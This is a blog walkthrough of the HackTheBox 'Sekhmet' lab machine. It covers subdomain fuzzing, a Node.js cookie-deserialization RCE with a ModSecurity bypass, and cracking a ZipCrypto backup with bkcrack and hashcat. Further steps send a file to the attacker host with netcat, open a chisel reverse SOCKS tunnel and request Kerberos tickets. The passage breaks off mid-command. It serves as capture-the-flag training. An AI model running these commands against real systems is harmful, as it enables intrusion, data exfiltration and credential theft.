<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7"><meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" ><meta name="generator" content="Jekyll v4.4.1" /><meta property="og:title" content="HackTheBox-Sekhmet Walkthrough" /><meta property="og:locale" content="en" /><meta name="description" content="A minimal, responsive, and powerful Jekyll theme for presenting professional writing." /><meta property="og:description" content="A minimal, responsive, and powerful Jekyll theme for presenting professional writing." /><link rel="canonical" href="/posts/HackTheBox-Sekhmet_/" /><meta property="og:url" content="/posts/HackTheBox-Sekhmet_/" /><meta property="og:site_name" content="Mostafa Toumi" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2023-03-29T12:00:00+00:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="HackTheBox-Sekhmet Walkthrough" /><meta name="twitter:site" content="@EmSec0" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-03-29T12:00:00+00:00","datePublished":"2023-03-29T12:00:00+00:00","description":"A minimal, responsive, and powerful Jekyll theme for presenting professional writing.","headline":"HackTheBox-Sekhmet Walkthrough","mainEntityOfPage":{"@type":"WebPage","@id":"/posts/HackTheBox-Sekhmet_/"},"url":"/posts/HackTheBox-Sekhmet_/"}</script><title>HackTheBox-Sekhmet Walkthrough | Mostafa Toumi</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Mostafa Toumi"><meta name="application-name" content="Mostafa Toumi"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.20.1/dist/tocbot.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="https://raw.githubusercontent.com/Mostafatoumi/mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/emsec_1.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title"> <a href="/">Mostafa Toumi</a></div><div class="site-subtitle font-italic">Computer Networking Specialist | Penetration Tester | CTF Player</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/Mostafatoumi" aria-label="github" target="_blank" rel="noopener noreferrer"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/EmSec0" aria-label="twitter" target="_blank" rel="noopener noreferrer"> <i class="fa-brands fa-x-twitter"></i> </a> <a href="javascript:location.href = 'mailto:' + ['Mostafatoumi0','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="https://www.hackthebox.com/home/users/profile/962022" aria-label="hackthebox" target="_blank" rel="noopener noreferrer"> <i class="fas fa-cube"></i> </a> <a href="https://www.linkedin.com/in/mostafatoumi/" aria-label="linkedin" target="_blank" rel="noopener noreferrer"> <i class="fab fa-linkedin"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>HackTheBox-Sekhmet Walkthrough</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>HackTheBox-Sekhmet Walkthrough</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1680091200" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Mar 29, 2023 </em> </span><div class="d-flex justify-content-between"> <span> By <em> <a href="https://twitter.com/EmSec0">Mostafa Toumi</a> </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2302 words"> <em>12 min</em> read</span></div></div></div><div class="post-content"><p><a href="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/Sekhmet.png" class="popup img-link "><img data-src="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/Sekhmet.png" class="lazyload" data-proofer-ignore></a></p><hr /> <center><strong><font color="DarkGray">Hello everyone, This is EmSec, and I'm excited to share my experience of solving the Sekhmet machine from HackTheBox. As an enthusiast of cybersecurity, I've been exploring various hacking challenges and this machine was truly insane.</font></strong></center><hr /><h2 id="enumeration"><span class="mr-2"><strong><strong><font color="Brown">Enumeration</font></strong></strong></span><a href="#enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><hr /><h2 id="gaining-access"><span class="mr-2">Gaining Access</span><a href="#gaining-access" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span> 5000 10.10.11.179
</pre></table></code></div></div><p><a href="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/1.png" class="popup img-link "><img data-src="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/1.png" class="lazyload" data-proofer-ignore></a></p><p>When trying to head to the webpage, we need to use the www.windcorp.htb domain.</p><h2 id="website--windcorphtb"><span class="mr-2">Website : Windcorp.htb</span><a href="#website--windcorphtb" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>The page displays a common corporate website:</p><p><a href="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/2.png" class="popup img-link "><img data-src="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/2.png" class="lazyload" data-proofer-ignore></a> While looking through the web page, it’s worth noting some names that could be useful later on.</p><p><a href="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/3.png" class="popup img-link "><img data-src="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/3.png" class="lazyload" data-proofer-ignore></a> I started fuzzing with gobuster and wfuzz because this website possibly contains other subdomains, and I was able to find one at portal.windcorp.htb.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>ffuf  <span class="nt">-w</span> /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt <span class="nt">-u</span> http://www.windcorp.htb/  <span class="nt">-H</span> <span class="s2">"Host: FUZZ.windcorp.htb/"</span>  <span class="nt">--fw</span> 3
</pre></table></code></div></div><p><a href="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/4.png" class="popup img-link "><img data-src="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/4.png" class="lazyload" data-proofer-ignore></a></p><p>Let’s add that to the /etc/hosts file and enumerate there.</p><h2 id="website--portalwindcorphtb"><span class="mr-2">Website : portal.windcorp.htb</span><a href="#website--portalwindcorphtb" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>A login page greets us at the new domain:</p><p><a href="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/5.png" class="popup img-link "><img data-src="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/5.png" class="lazyload" data-proofer-ignore></a></p><p>Luckly,I attempted to login with admin:admin, and it worked!</p><p><a href="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/6.png" class="popup img-link "><img data-src="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/6.png" class="lazyload" data-proofer-ignore></a></p><p>I didn’t find anything interesting on this page. Therefore, I decided to use Burp Suite to inspect the background activity. As I proxied the traffic, I stumbled upon an intriguing cookie.</p><p><a href="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/7.png" class="popup img-link "><img data-src="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/7.png" class="lazyload" data-proofer-ignore></a></p><p>It appeared as a JWT token, but it was not actually a profile cookie: <a href="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/8.png" class="popup img-link "><img data-src="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/8.png" class="lazyload" data-proofer-ignore></a> Furthermore, the website utilized Express as its backend framework, which could assist in identifying potential vulnerabilities related to these cookies</p><h2 id="bypassing-modsec-rce"><span class="mr-2">Bypassing ModSec (RCE)</span><a href="#bypassing-modsec-rce" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>I encountered an error while attempting to fuzz the login page using SQL Injection payloads.</p><p><a href="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/10.png" class="popup img-link "><img data-src="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/10.png" class="lazyload" data-proofer-ignore></a></p><p>ModSec appears to be the WAF employed to safeguard this webpage, which seems peculiar. Further investigation into Mod Security’s cookie-related exploits unearthed several informative articles, including this one:</p><p>READ MORE HERE : <a href="https://www.secjuice.com/modsecurity-vulnerability-cve-2019-19886/" target="_blank"> modsecurity-vulnerability-cve-2019-19886</a></p><p>The article explains how the use of a second equals sign within the cookie parameter may result in a DoS condition with Mod Security.</p><p><a href="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/11.png" class="popup img-link "><img data-src="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/11.png" class="lazyload" data-proofer-ignore></a></p><p>From the website’s architecture, it appears to be built on the Express framework. Upon investigating potential vulnerabilities related to cookies and Express, I came across an informative article at <a href="https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/" target="_blank"> exploiting-node-js-deserialization-bug-for-remote-code-execution</a>. It suggests that there may be a deserialization exploit in play, and that ModSec could be a key factor related to the use of cookies.</p><p>To create a payload, we can follow the tutorial provided in the article. Specifically, we can leverage nodejsshell.py to generate a shell, and then use base64 to encode it.</p><p><a href="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/12.png" class="popup img-link "><img data-src="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/12.png" class="lazyload" data-proofer-ignore></a> we can encode it by using Burp Suite like so :</p><p><a href="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/13.png" class="popup img-link "><img data-src="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/13.png" class="lazyload" data-proofer-ignore></a></p><p>To bypass ModSec and enable the RCE to work, we needed to add something to the end of the cookie. This additional information would allow the cookie to pass through, and we included it in the final request sent via Burpsuite.</p><p><a href="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/14.png" class="popup img-link "><img data-src="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/14.png" class="lazyload" data-proofer-ignore></a> I managed to retrieve a shell using this method as a webster user after sending this request.</p><p><a href="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/15.png" class="popup img-link "><img data-src="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/15.png" class="lazyload" data-proofer-ignore></a></p><h2 id="webserver-foothold"><span class="mr-2">Webserver Foothold</span><a href="#webserver-foothold" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Although this machine was intended to run on Windows, I found myself in a Linux host, which was very strange. This discovery confirms that there are multiple hosts with different operating systems on this box, likely related to Active Directory.</p><h2 id="zip-cracking"><span class="mr-2">ZIP Cracking</span><a href="#zip-cracking" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>I found that backup.zip interesting,But when attempting to unzip it, we noticed that the file is password-protected and contains the /etc/passwd file. Additionally, there are numerous other files related to Active Directory, including GPOs and Kerberos configurations.</p><p><a href="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/16.png" class="popup img-link "><img data-src="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/16.png" class="lazyload" data-proofer-ignore></a></p><p>I was struck by how peculiar it was to come across a random zip file here. Despite my attempts to crack the hash, I couldn’t make any headway. So, I decided to transfer the file back to my machine and use ‘7z l -slt’ to scrutinize the technical details of the zip file. on the target:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>nc <span class="nt">-w</span> 4 10.10.14.xx 1234 &lt; backup.zip
</pre></table></code></div></div><p>on attacker :</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>nc <span class="nt">-lnv</span> <span class="o">&gt;</span> backup.zip
</pre></table></code></div></div><p><a href="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/17.png" class="popup img-link "><img data-src="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/17.png" class="lazyload" data-proofer-ignore></a></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>7z l <span class="nt">-slt</span> backup.zip
</pre></table></code></div></div><p><a href="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/18.png" class="popup img-link "><img data-src="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/18.png" class="lazyload" data-proofer-ignore></a></p><p>Since ZipCrypto Deflate was used, The <a href="https://github.com/kimci86/bkcrack" target="_blank"> bkcrack</a> exploit could be employed on this file because of the outdated encryption method it employs.</p><p>To exploit this:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="c"># create a new zip of the passwd file</span>
<span class="nb">cp</span> /etc/passwd <span class="nb">.</span>
zip passwd.zip passwd
<span class="c"># use bkcrack to crack the keys</span>
./bkcrack <span class="nt">-C</span> backup.zip <span class="nt">-c</span> etc/passwd <span class="nt">-P</span> passwd.zip <span class="nt">-p</span> passwd
<span class="c"># use the codes found to create a new zip file with a known password</span>
./bkcrack <span class="nt">-C</span> backup.zip <span class="nt">-U</span> cracked.zip password <span class="nt">-k</span> &lt;code1&gt; &lt;code2&gt; &lt;code3&gt;
</pre></table></code></div></div><p><a href="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/19.png" class="popup img-link "><img data-src="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/19.png" class="lazyload" data-proofer-ignore></a></p><p>it take some time but its works fine.This should create a new zip file that we can open easily.</p><p><a href="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/21.png" class="popup img-link "><img data-src="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/21.png" class="lazyload" data-proofer-ignore></a> Now, let’s examine the files contained within this zip folder more thoroughly.</p><h2 id="enumeration-files"><span class="mr-2">Enumeration Files</span><a href="#enumeration-files" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Looking through the zip file, I came across numerous configuration files. My attention was immediately drawn to the /var/lib/sss/db directory, which contained several ldb files.</p><p><a href="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/22.png" class="popup img-link "><img data-src="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/22.png" class="lazyload" data-proofer-ignore></a></p><p>I discovered a credential by running the ‘strings’ command on the cache_windcorp.htb.ldb file, which revealed that the associated user was ‘ray.duncan’</p><p><a href="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/23.png" class="popup img-link "><img data-src="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/23.png" class="lazyload" data-proofer-ignore></a></p><p>And he has a hashed password within this folder.</p><p><a href="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/24.png" class="popup img-link "><img data-src="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/24.png" class="lazyload" data-proofer-ignore></a></p><p>This hash can be cracked easily by using hashcat or john :</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>.<span class="se">\h</span>ashcat.exe <span class="nt">-m</span> 1800 .<span class="se">\h</span>ash.txt .<span class="se">\r</span>ockyou.txt<span class="sb">`</span>
</pre></table></code></div></div><p><a href="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/25.png" class="popup img-link "><img data-src="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/25.png" class="lazyload" data-proofer-ignore></a></p><p>Now that we possess some credentials, performing additional enumeration on the files exposes the presence of other networks on this machine</p><p><a href="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/26.png" class="popup img-link "><img data-src="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/26.png" class="lazyload" data-proofer-ignore></a></p><p>The KDC (and therefore DC) of this machine was found to be at 192.168.0.2. The other database files contained references to a domain called hope.windcorp.htb</p><p><a href="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/27.png" class="popup img-link "><img data-src="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/27.png" class="lazyload" data-proofer-ignore></a></p><p>I was stuck here for a while because I was trying to log in to SSH with just “ray.duncan”, but then I realized that we need to log in with the domain name, like this: “ray.duncan@windcorp.htb” (yes, that’s his username)</p><p><a href="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/28.png" class="popup img-link "><img data-src="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/28.png" class="lazyload" data-proofer-ignore></a></p><p>We are now on the same web server host with persistence enabled. After confirming that this machine is related to Active Directory and dealing with Kerberos-related issues, we can request and cache a ticket via kinit. Further research on how to use a ticket in Linux led me to ksu, which essentially functions like su but with Kerberos support.</p><p>By using these commands, we can elevate our privileges to root on this container and obtain the user flag.</p><p><a href="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/29.png" class="popup img-link "><img data-src="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/29.png" class="lazyload" data-proofer-ignore></a></p><p>Let’s now explore ways to enumerate Active Directory. This machine is quite lengthy.</p><h2 id="active-directory"><span class="mr-2">Active Directory</span><a href="#active-directory" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>After discovering another IP address at 192.168.0.2, our next task was to enumerate the open ports on that machine. To accomplish this, we can either use the <a href="https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap" target="_blank"> Nmap binary</a> or run this one-liner to determine which ports are currently open:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="k">for </span>p <span class="k">in</span> <span class="o">{</span>1..65535<span class="o">}</span><span class="p">;</span> <span class="k">do </span>nc <span class="nt">-vn</span> 192.168.0.2 <span class="nv">$p</span> <span class="nt">-w</span> 1 <span class="nt">-z</span> &amp; <span class="k">done </span>2&gt; output.txt
</pre></table></code></div></div><p>From here, we can see some ports that are open.</p><p><a href="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/30.png" class="popup img-link "><img data-src="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/30.png" class="lazyload" data-proofer-ignore></a></p><p>It’s now confirmed that the genuine DC is located at 192.168.0.2 To proceed with the enumeration process, we’ll have to utilize <a href="https://github.com/jpillora/chisel" target="_blank"> chisel</a> and proxychains to route traffic towards that address.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="c"># on attacker machine</span>
./chisel server <span class="nt">--port</span> 1337 <span class="nt">--reverse</span>

<span class="c"># on target machine</span>
./chisel client <span class="nt">--max-retry-count</span><span class="o">=</span>1 10.10.14.149:1337 R:1080:socks
</pre></table></code></div></div><p>Enumerating the DC with proxychains works fine later on:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>proxychains curl http://192.168.0.2
</pre></table></code></div></div><p><a href="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/31.png" class="popup img-link "><img data-src="https://raw.githubusercontent.com/Mostafatoumi/Mostafatoumi.github.io/main/assets/img/favicons/HackTheBox/Sekhmet/31.png" class="lazyload" data-proofer-ignore></a></p><p>Let’s begin by enumerating the domain properly. My initial observation was the open port 53 for DNS in the output. We can utilize ‘dig’ to discover more information.</p><h2 id="silver-ticket-and-smb-shares"><span class="mr-2">Silver Ticket and SMB Shares</span><a href="#silver-ticket-and-smb-shares" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>With the credentials for ray.duncan, we can actually request a ticket for him. This can be done using impacket-getST.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>proxychains impacket-getST <span class="nt">-dc-ip</span> 192.168.0.2 <span class="nt">-spn</span> cifs/hope.windcorp.htb <span class="s1">'windcorp/ray.duncan:pantera'</span>

<span class="nb">export </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>ray.duncan.ccache

klist <span class="c">#to display the Ticket cache</span>
